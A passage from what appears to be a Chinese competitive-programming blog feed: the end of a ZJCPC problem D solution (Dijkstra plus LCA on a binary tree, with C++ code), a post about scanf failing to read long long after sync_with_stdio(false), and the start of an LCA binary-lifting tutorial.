个祖先的最短路径。那么对于任意两点的最短路径，我只需要寻找它们的最近公共祖先，然后答案就是 $a$ 到最近公共祖先的最短路加上 $b$ 到最近公共祖先的最短路。当然我们还有一个情况得考虑，因为 $dis[i][k]$ 的定义仅仅是到它祖先的最短路径，而不是到这个节点的最短路径。因此它祖先的祖先可能有更优的路线。</p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/3.png" alt="3"></p><p>就比如这样一个图，图中我把关键数据标注出来了，无关数据没有标注。</p><p>如果说我要求 $8$ 和 $11$ 的最短路，按照我刚刚的定义很容易算的出来，它们的 $LCA$ 是 $2$，然后 $8$ 和 $11$ 到 $2$ 的最短路径都是 $2$，所以我算出来 $8$ 到 $11$ 的最短路径是 $4$，但是显然这里还有一个更优的解，那就是 $8\to1\to11$ 这样才只有 $2$ 的距离。但是最优的路线只可能存在于它的祖先上面了，其它地方不可能有。因此我们在用刚刚那个算法的时候还得兼顾一下查找 $LCA$ 的祖先的答案。</p><p>这样子的话，假如我们能在规定时间内预处理完数据，那么我们每次查询的时间复杂度就只有 $O(log_2n)$ 了，也不会超时。那么我们看看怎么去预处理这个 $dis$ 数组。</p><p>我们只需要以每一个节点为根节点，和根节点的子节点作为一张图去跑单源最短路即可。对于 $1$ 来说，它的复杂度会是 $O(nlog_2n)$ ，每向下走一层，根节点数量翻倍，子节点数量减半。第二层中，总共复杂度将是 $O(2 \times \frac{n}{2}log_2\frac{n}{2})$ 这么算下来这一层接近 $O(nlog_2n)$ ，此后每一层都接近 $O(nlog_2n)$。它一共有几层呢？$log_2n$层。所以预处理的时间复杂度仅仅只有 $O(n(log_2n)^2)$ 这个时间复杂度是完全不会超时的。</p><p>我们肯定还是选择 $dijsktra$ 算法作为我们的单源最短路算法，加上一个优先队列优化，单源最短路需要每一个点给一个 $d$ 数组标记所有节点到源点的最短路，但是这样空间会炸。所以我们每次跑最短路空间得共用，如何保证他们不会串呢？用标记数组。比如我在以 $1$ 为根节点的时候，我就给标记打上 $1$，当我要更新 $d$ 里面的值的时候我先比较一下上一个使用 $d$ 数组的时候这个标记是否为我当前的根节点，如果是则更新，如果不是，则先初始化为一个很大的值。一般情况下我们选择 $INF=0x3f3f3f3f3f3f3f3f$ 因为这样不容易溢出，也能表示无穷大。</p><p>但是呢，想想 $dijsktra$ 算法还有什么需要注意的？那就是每次选完一个点的时候，它不会再被更新，这个时候我需要再打上一个标记，防止它被其它相连的边重复更新答案。一般情况下我们是选择 $0,1$ 的，但是这里我们要一起用我们就选择根节点的值呗，如果当前根节点和这个值不相等说明这个点没有被添加，那就添加并将标记更新为当前的根节点。</p><p>那么思路清晰了我们就开写。</p><h3 id="循序渐进"><a href="#循序渐进" class="headerlink" title="循序渐进"></a>循序渐进</h3><p>首先开这么几个数组</p><ul><li>$d[i]$ 表示 $i$ 点到当前根节点的最短路径</li><li>$vis1[i]$ 表示 $i$ 节点上一次被 $vis1[i]$ 节点标记为已经添加最短路的答案</li><li>$vis2[i]$ 表示 $i$ 节点的 $d[i]$ 上一次是在以 $vis2[i]$ 为根节点时更新的</li></ul><p>图的话我们采用经典链式前向星存储，优先队列我们存储这么两个信息：</p><ol><li>x节点的最短路径</li><li>x节点</li></ol><p>我们肯定每次是以最路径为关键字进行小根堆构造的，这样保证每次 $pop$ 出来的答案都是当前未被添加的节点中最小的那个答案。</p><p>于是我们不难写出以下代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);<span class="comment">//先把根节点丢进去</span></span><br><span class="line">    d[root]=<span class="number">0</span>;<span class="comment">//自己到自己肯定就是0</span></span><br><span class="line">    vis2[root]=root;<span class="comment">//自己这个答案肯定要被标记，防止下面找到被初始化，当然你如果严格规定所得节点必须&lt;root也没关系，因为下面会被初始化为INF。</span></span><br><span class="line">    <span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">        p.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=x.second;<span class="comment">//当前找到了一个距离最短的节点</span></span><br><span class="line">        <span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;<span class="comment">//如果已经被添加过了那么就不做以下处理</span></span><br><span class="line">        vis1[point]=root;<span class="comment">//把这个节点标记为已经添加进了答案中</span></span><br><span class="line">        dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];<span class="comment">//更新答案，这里的cal_c用于判断root在point的第几个祖先，我们设父亲为第一个祖先。</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;<span class="comment">//更新所有与之相连的点的答案</span></span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;<span class="comment">//基本判断防止找到root的父亲</span></span><br><span class="line">            <span class="keyword">if</span>(vis2[to]!=root)&#123;<span class="comment">//如果不是root说明上一次使用d[to]数组的还是上一次……啊不，是没用过d[to]这个值，所以要被初始化为一个无穷大</span></span><br><span class="line">                d[to]=INF;</span><br><span class="line">                vis2[to]=root;<span class="comment">//标记</span></span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;<span class="comment">//单源最短路判断</span></span><br><span class="line">                d[to]=d[point]+edge[i].w;</span><br><span class="line">                p.<span class="built_in">push</span>(&#123;d[to],to&#125;);<span class="comment">//push进优先队列中</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么结合代码中你的注释相信你已经不难理解这个 $dijsktra$ 算法了。</p><p>我们再看看查询这部分的代码应该怎么写，无非就是先求出 $LCA$ ，然后循环 $LCA$ 以及 $LCA$ 祖先的答案。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);<span class="comment">//先求最近公共祖先</span></span><br><span class="line">    <span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);<span class="comment">//算出他们在那个点的第几个祖先</span></span><br><span class="line">    <span class="keyword">int</span> ans=INF;</span><br><span class="line">    <span class="keyword">while</span>(lca)&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);<span class="comment">//寻找最小值</span></span><br><span class="line">        lx++,ly++;<span class="comment">//每次往上看看那个祖先</span></span><br><span class="line">        lca&gt;&gt;=<span class="number">1</span>;<span class="comment">//完全二叉树怎么找自己的父亲，这个不难吧？</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);<span class="comment">//输出答案</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重要的部分写完了之后那么整个程序就呼之欲出了，但是一定得注意，不开 $long long$ 见祖宗哦。</p><p>然后还有一点就是，既然你开了 $long long$ 一定不要忘了 $inf$ ，不要漏写一半，不然真到比赛要么哭罚时，要么哭整整一题了，不管前者后者，都是很伤的，建议先记在心里。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next;</span><br><span class="line">    <span class="keyword">int</span> to;</span><br><span class="line">    <span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> head[maxn],dis[maxn][<span class="number">30</span>],cnt,n,m;</span><br><span class="line"><span class="keyword">int</span> vis1[maxn];</span><br><span class="line"><span class="keyword">int</span> vis2[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line">priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt; &gt; p;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_c</span><span class="params">(<span class="keyword">int</span> child,<span class="keyword">int</span> ancestor)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(child&gt;ancestor)&#123;</span><br><span class="line">        cnt++;</span><br><span class="line">        child&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">    edge[++cnt].next=head[x];</span><br><span class="line">    edge[cnt].to=y;</span><br><span class="line">    edge[cnt].w=w;</span><br><span class="line">    head[x]=cnt;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">    p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);</span><br><span class="line">    d[root]=<span class="number">0</span>;</span><br><span class="line">    vis2[root]=root;</span><br><span class="line">    <span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">        p.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">int</span> point=x.second;</span><br><span class="line">        <span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;</span><br><span class="line">        vis1[point]=root;</span><br><span class="line">        dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;</span><br><span class="line">            <span class="keyword">int</span> to=edge[i].to;</span><br><span class="line">            <span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(vis2[to]!=root)&#123;</span><br><span class="line">                d[to]=INF;</span><br><span class="line">                vis2[to]=root;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;</span><br><span class="line">                d[to]=d[point]+edge[i].w;</span><br><span class="line">                p.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b)a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> b&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y,w;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line">        <span class="built_in">add</span>(x,y,w);</span><br><span class="line">        <span class="built_in">add</span>(y,x,w);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis)); </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">dijkstra</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> x,y;</span><br><span class="line">        cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        <span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);</span><br><span class="line">        <span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);</span><br><span class="line">        <span class="keyword">int</span> ans=INF;</span><br><span class="line">        <span class="keyword">while</span>(lca)&#123;</span><br><span class="line">            ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);</span><br><span class="line">            lx++,ly++;</span><br><span class="line">            lca&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>蒟蒻的提交记录。</p><p><a href="https://codeforces.com/gym/103055/problem/D">测评网站</a></p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/4.png" alt="8"></p><p>至于踩的那几个坑嘛，就是 $long long$ 的问题了，然后还有一点就是输入的问题，这个具体看我上一篇博客吧，我到现在还没太弄懂，不过至少能注意规避的技巧了：那就是千万别在开</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>的情况下用 $scanf$ 去读取 $long long$ 数据，不然你会怀疑人生。</p><p>希望这次省赛能超越上次的自己吧，$xia0ji233,fighting！！！$</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 图论 </category>
          
          <category> LCA </category>
          
          <category> 最短路径 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++文件的输入输出问题</title>
      <link href="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
      <url>/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>今天写这篇博客纯粹就是遇到点问题，不知道有没有人遇到过。</p><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近打CF的时候发现交上去一个答案发生了非预期退出，而且是在样例里面发生的，于是我赶紧把程序扒下来最大限度地确定出现问题的代码段，最终出现了以下代码写的程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> q;</span><br><span class="line">    cin&gt;&gt;q;</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> s,t;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>,&amp;s,&amp;t);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s=%lld t=%lld\n&quot;</span>,s,t); </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先万能头文件，然后我打开了一个文件把标准输入流重定向到一个文件中，并且关闭了 $cin$ 和 $cout$ 的同步流，大概率问题是出在这里的，然后就一些常规操作没什么好说的。</p><p>我的 $1.in$ 的文件内容如下图所示：</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>是正常的输入数据，并且文件编码为 $UTF-8$ 没有任何问题。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>那么我们开 $DEV$ 运行以下先。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>可以看到程序运行出现了非预期结果。</p><p>由于 $DEV$ 不方便调试我们便把 $IDE$ 换成了 $VScode$ 。</p><p>这里我们在 $scanf$ 和 $printf$ 分别打一个断点，然后开启调试模式。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>这里 $s$ 和 $t$ 是随机值正常，因为我们并没有初始化 $s$ 和 $t$ 。</p><p>那么我们 $F10$ 步过看看结果。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="4"></p><p>过了 $scanf$ 却没有成功读入数据！！！这是为什么？</p><p>我开始尝试找不同的原因，原因1就是怀疑文件读入的问题，所以我们先注释重定向那一行测试看看。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>运行结果是正常的，这么看来问题似乎解决了。</p><p>但是提交给oj是实实在在地报错了，因此我们尝试注释其它代码看看情况，这里我们接着选择注释这个关闭同步流的代码。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>这回居然正常读入了数据！什么鬼？</p><p>因为刚刚我把 $freopen$ 注释了是确确实实读入没有什么问题了，但是现在似乎把</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>给关闭了程序也是能正常进行的。</p><p>而且这里我还测试了第三种情况：两者都打开，把 $long long$ 换回 $int$ 类型。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/7.png" alt="7"></p><p>居然也是正常读入？也就是说，打开文件，在关闭同步流的情况下使用 $scanf$ 读入 $long long$ 数据类型会导致读入不成功，而且注释了打开文件提交给 oj 测评返回了错误结果。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我个人感觉可能涉及到底层的一些问题了。因为自己测试确实三种情况同时满足会导致读入数据失败。这三种情况分别是</p><ol><li>重定向 $stdin$ 到一个文件</li><li>关闭IO同步流</li><li>用 $scanf$ 读入 $long long$ 数据</li></ol><p>一般来说，$scanf$ 不接收到 $EOF$ 信号是会一直等待你输入的。常见的 $EOF$ 基本就是读到文件尾，或者手动给终端了一个 $Ctrl + Z$ 信号给程序，这应该算外部中断了。就基本不会遇到 $scanf$ 读入失败的情况。要真的能有这么好数据那不是可以随便泄露？如果上一个栈帧保存的一些变量的地址刚好在这，我这里故意读入失败那就直接泄露地址，我没见过这样的情况。</p><p>当然我比较浅薄，只能看到表面上的一些东西，如果你有深层次点的合理的解释麻烦你也联系我，我也不想就在这里留一个错误的结论，期待这个问题能早点解决。</p><p>下面我也给出以下本次实验用到的<a href="broken.zip">附件</a>供大家测试，看看能不能是版本的问题。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> stdin </category>
          
          <category> stdout </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>最近公共祖先求解</title>
      <link href="/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/"/>
      <url>/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>最近来复习一遍图论的板子——LCA。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>最近公共祖先</strong>（英语：lowest common ancestor）是指在一个<a href="https://zh.wikipedia.org/wiki/%E6%A0%91_(%E5%9B%BE%E8%AE%BA)">树</a>或者<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE">有向无环图</a>中同时拥有<em>v</em>和<em>w</em>作为后代的最深的节点。在这里，我们定义一个节点也是其自己的后代，因此如果<em>v</em>是<em>w</em>的后代，那么<em>w</em>就是<em>v</em>和<em>w</em>的最近公共祖先。(fron wiki)</p><h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h3><p>我们先来看看应该怎么解决此类问题。</p><h4 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h4><p>在一个树上，我们定义离根节点最远的与a,b相同的祖先为最近公共祖先(LCA)。我们需要怎么做呢，首先肯定是 dfs 跑一遍，把所有的点的层次遍历出来，时间复杂度为 $O(N)$。一般情况下 $LCA$ 问题会有多次询问，询问次数一般为 $q&lt;10^5$ ，那么就意味着我们不能在线性时间内去计算 $LCA$，如果采取最朴素的方法：选定2个点，若深度不一样则先转为深度一样，深度较深的点不停求它的父亲节点直到深度一样，然后用如下代码去求解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">        a=pre[a];</span><br><span class="line">        b=pre[b];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样当然可以，而且非常符合最近公共祖先的定义，只是只需要稍微构造一下数据就可以 $T$ 到飞起。</p><h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>有一点不难发现：如果我和你有一个公共祖先，则公共祖先的祖先一定也是我们的公共祖先。比如亲兄弟之间，它们的公共祖先就是它们的父母（这里我们假设父母是一个人，爷爷奶奶姥姥姥爷等也是一个人），父母的祖先也就是爷爷奶奶它们同样也是这亲兄弟的公共祖先。再有一个，如果我们两个人的父亲不相同，则我们的公共祖先也等于我们父亲之间的公共祖先，这个都是能直接得到的结论。那么它在一定意义上是有序的，我们就可以采用倍增+二分的思路。</p><p>假设 $fa[a][k]$ 为差 $a$ 点 $2^k$ 辈的祖先，$fa[a][0]$ 就表示 $a$ 的父亲。在搜索的时候我们先观察节点所在的深度然后取得离他们最远的公共祖先。也就是 $fa[a][log_2deep[a]]$ </p><p>但是你可能会发现，如果深度为7，那么它最多只能往上找 $4$ 个祖先，而如果公共祖先刚好是根节点，那么怎么办呢？那么我们不选择缩小区间，而是把 $a,b$ 当成新的对象来算公共祖先。那你有会发现，如果再往上找4个，那么会没有这个值，那怎么办呢？其实我们不需要它有，我们只需要它相等即可。因为根节点一定是所有节点之间的公共祖先，所以我们直接就这么找，找到相等区间往里面缩小一半，就往上找2个祖先，这时候可以发现刚好在根节点之前，如果它们的最近公共祖先是根节点，那么同理，这次寻找又会往上再找两个祖先。又跑到了根节点之外，判断相等，区间缩小为1。区间缩小为1的时候退出循环，此时我们要找的最近公共祖先就在当前点的父亲节点。</p><p>不知道这是否能解决你在运用倍增法求 $LCA$ 的疑惑。</p><p>可以看到每次以树的高度为范围，区间缩小一半地求，效率是非常高的。求一次 $LCA$ 的时间复杂度仅仅为 $log_2n$。</p><h2 id="题目练手"><a href="#题目练手" 